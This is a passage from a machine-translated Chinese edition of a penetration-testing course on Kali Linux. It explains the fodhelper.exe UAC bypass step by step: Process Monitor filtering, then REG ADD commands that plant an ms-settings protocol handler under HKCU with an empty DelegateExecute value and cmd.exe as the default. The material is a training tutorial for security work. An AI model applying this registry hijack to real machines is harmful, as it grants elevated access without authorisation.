<div style="position:absolute;top:126926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FOUND”，一条错误消息，表明应用程序正在尝试访问注册表</font></font></nobr></div>
<div style="position:absolute;top:126945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不存在的条目。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:127291;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="108"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 108 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:127324;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:128401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:128401;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:128401;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">549</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127727;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 281：按结果筛选的 Procmon</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际上会生成“NAME NOT FOUND”错误，</font></font></nobr></div>
<div style="position:absolute;top:127778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">潜在可利用注册表项的指示符。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128212;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 282：按结果结果筛选 Procmon</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，由于我们不能随意修改每个 hive 中的注册表项，因此我们需要关注</font></font></nobr></div>
<div style="position:absolute;top:128263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以控制注册表配置单元。</font><font style="vertical-align: inherit;">在这种情况下，我们将关注 HKEY_CURRENT_USER ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKCU</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 配置单元，</font></font></nobr></div>
<div style="position:absolute;top:128282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们，当前用户，拥有对以下内容的读写访问权限： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:128479;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="109"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 109 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:128512;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:129589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:129589;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:129589;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">550</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128915;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 283：按路径的 Procmon 过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用此附加过滤器会产生以下结果：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129190;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 284：fodhelper.exe 寻找命令值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据这个输出，我们看到了一些很有趣的东西。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用</font></font></nobr></div>
<div style="position:absolute;top:129241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试查询 HKCU:\Software\Classes\ms-settings\shell\open\command 注册表项，</font></font></nobr></div>
<div style="position:absolute;top:129260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这似乎不存在。</font></font></nobr></div>
<div style="position:absolute;top:129293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了更好地理解为什么会发生这种情况以及该注册表项的确切用途，</font></font></nobr></div>
<div style="position:absolute;top:129312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将修改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Path</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下的检查，</font><font style="vertical-align: inherit;">并专门查找对包含</font></font></nobr></div>
<div style="position:absolute;top:129331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-settings\shell\open\command。</font><font style="vertical-align: inherit;">如果该进程可以成功访问其他一些密钥</font></font></nobr></div>
<div style="position:absolute;top:129351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hive，结果将为我们提供更多线索。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:129667;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="110"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 110 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:129700;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:130777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:130777;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:130777;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">551</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130099;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 285：Shell\open\command 执行路径</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此输出包含一个有趣的结果。</font><font style="vertical-align: inherit;">当 fodhelper 找不到 ms-</font></font></nobr></div>
<div style="position:absolute;top:130149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKCU 中的 settings\shell\open\command 注册表项，它会立即尝试访问</font></font></nobr></div>
<div style="position:absolute;top:130168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKEY_CLASSES_ROOT (HKCR) 配置单元。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">518</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于该条目确实存在，因此访问成功。</font></font></nobr></div>
<div style="position:absolute;top:130201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们在注册表中搜索 HKCR:ms-settings\shell\open\command，我们会找到一个有效的条目：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130531;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 286：DelegateExecute 注册表项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于此观察，并在 MSDN 文档</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">519 中</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索此注册表项后</font></font></nobr></div>
<div style="position:absolute;top:130581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">application-name\shell\open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），我们可以推断 fodhelper 正在打开</font></font></nobr></div>
<div style="position:absolute;top:130600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 设置应用程序（可能是管理可选功能在</font></font></nobr></div>
<div style="position:absolute;top:130620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper 启动）通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-settings:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序协议。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">520</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用协议</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:130687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">518 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/sysinfo/hkey-classes-root-key</font></font></font></nobr></div>
<div style="position:absolute;top:130707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">519 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/shell/launch</font></font></font></nobr></div>
<div style="position:absolute;top:130727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">520 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（埃里克·劳，2011 年），https://blogs.msdn.microsoft.com/ieinternals/2011/07/13/understanding-protocols/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:130855;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="111"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 111 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:130888;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:131965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:131965;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:131965;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">552</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 定义了当程序使用特定 URL 时要启动的可执行文件。</font><font style="vertical-align: inherit;">这些网址-</font></font></nobr></div>
<div style="position:absolute;top:131003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序映射可以通过类似于我们使用的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-setting</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键的</font><font style="vertical-align: inherit;">注册表项来定义。</font></font></nobr></div>
<div style="position:absolute;top:131022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 HKCR 中找到（上图 286）。</font><font style="vertical-align: inherit;">在这种特殊情况下，ms-的应用程序协议架构</font></font></nobr></div>
<div style="position:absolute;top:131042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置将执行传递给 COM </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">521</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象而不是程序。</font><font style="vertical-align: inherit;">这可以通过</font></font></nobr></div>
<div style="position:absolute;top:131061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DelegateExecute</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键值</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">522</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为 MSDN 中详述的特定 COM 类 ID</font></font></nobr></div>
<div style="position:absolute;top:131081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档。</font></font></nobr></div>
<div style="position:absolute;top:131113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这绝对有趣，因为 fodhelper 尝试访问</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-setting</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表项中的</font></font></nobr></div>
<div style="position:absolute;top:131132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKCU蜂巢先。</font><font style="vertical-align: inherit;">Process Monitor 的先前结果清楚地表明该密钥不存在</font></font></nobr></div>
<div style="position:absolute;top:131152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 HKCU 中，但我们应该有必要的权限来创建它。</font><font style="vertical-align: inherit;">这可以让我们劫持</font></font></nobr></div>
<div style="position:absolute;top:131171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过正确格式化的协议处理程序执行。</font><font style="vertical-align: inherit;">让我们尝试用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REG </font></font></i><font style="vertical-align: inherit;"><font style="font-size:8px"><font style="vertical-align: inherit;">523</font></font><font style="vertical-align: inherit;">添加这个键</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:131191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公用事业：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command</font></font></font></b></nobr></div>
<div style="position:absolute;top:131242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作成功完成。</font></font></nobr></div>
<div style="position:absolute;top:131277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\管理员&gt;</font></font></nobr></div>
<div style="position:absolute;top:131296;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 560 - 将命令值添加到注册表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加注册表项后，我们将从进程监视器中清除所有结果（使用</font></font></nobr></div>
<div style="position:absolute;top:131345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 287 中突出显示的图标），重新启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并监视进程活动：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131713;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 287：清除进程监视器的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，清除输出显示并不会清除我们创建的过滤器。</font><font style="vertical-align: inherit;">他们得救了</font></font></nobr></div>
<div style="position:absolute;top:131764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不需要重新创建它们。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:131875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">521 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model</font></font></font></nobr></div>
<div style="position:absolute;top:131895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">522 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexa</font></font></font></nobr></div>
<div style="position:absolute;top:131915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">523 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:132043;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="112"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 112 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:132076;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:133153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:133153;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:133153;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">553</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132403;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 288：再次获取 Process Monitor 的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上图显示，这一次，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试查询一个值</font></font></nobr></div>
<div style="position:absolute;top:132454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DelegateExecute) 存储在我们新创建的命令键中。</font><font style="vertical-align: inherit;">这在我们之前没有发生</font></font></nobr></div>
<div style="position:absolute;top:132473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建了我们的假应用协议密钥。</font><font style="vertical-align: inherit;">但是，由于我们不想劫持执行</font></font></nobr></div>
<div style="position:absolute;top:132492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 COM 对象，我们将添加一个 DelegateExecute 条目，将其值留空。</font><font style="vertical-align: inherit;">我们的希望是</font></font></nobr></div>
<div style="position:absolute;top:132512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 fodhelper 发现这个空值时，它将遵循 MSDN 应用程序规范</font></font></nobr></div>
<div style="position:absolute;top:132531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议并将查找在 Shell\Open\command\Default 键中指定的要启动的程序</font></font></nobr></div>
<div style="position:absolute;top:132551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入口。</font></font></nobr></div>
<div style="position:absolute;top:132583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font><font style="vertical-align: inherit;">带有</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">/v</font></font></b><font style="vertical-align: inherit;">参数的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REG ADD</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定值名称和</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">/t</font></font></b><font style="vertical-align: inherit;">来指定类型：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v Delega</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:132635;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">teExecute /t REG_SZ</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作成功完成。</font></font></nobr></div>
<div style="position:absolute;top:132671;left:241"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 561 - 将 DelegateExecute 值添加到命令注册表项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了验证 fodhelper 是否成功访问了 DelegateExecute 条目，我们刚刚</font></font></nobr></div>
<div style="position:absolute;top:132720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加，我们将删除“NAME NOT FOUND”过滤器并将其替换为“SUCCESS”以仅显示</font></font></nobr></div>
<div style="position:absolute;top:132740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功操作并再次重新启动该过程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133045;left:206"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 289：fodhelper.exe 检查命令注册表项下的（默认）值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，fodhelper 找到了我们添加的新的 DelegateExecute 条目，但由于其值为空，</font></font></nobr></div>
<div style="position:absolute;top:133096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它还查找</font><font style="vertical-align: inherit;">Shell\open\command 注册表项</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（默认）</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目值。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（默认）</font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:133231;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="113"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 113 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:133264;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:134341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:134341;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:134341;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">554</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加任何注册表项时，条目值会自动创建为 null。</font><font style="vertical-align: inherit;">我们将按照</font></font></nobr></div>
<div style="position:absolute;top:133379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序协议规范并用</font><font style="vertical-align: inherit;">我们的可执行文件</font><font style="vertical-align: inherit;">替换空</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（默认）</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值</font></font></nobr></div>
<div style="position:absolute;top:133398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这应该强制 fodhelper</font><font style="vertical-align: inherit;">使用我们自己的协议</font><font style="vertical-align: inherit;">来处理</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-settings:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议</font></font></nobr></div>
<div style="position:absolute;top:133418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行！</font></font></nobr></div>
<div style="position:absolute;top:133451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了测试这个理论，我们将设置我们的新注册表值。</font><font style="vertical-align: inherit;">我们还将指定新的注册表值</font></font></nobr></div>
<div style="position:absolute;top:133470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/d “cmd.exe”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以静默方式添加值。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.e</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:133522;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xe" /f</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作成功完成。</font></font></nobr></div>
<div style="position:absolute;top:133558;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 562 - 将（默认）值设置为 cmd.exe</font></font></i></nobr></div>
</span></font>
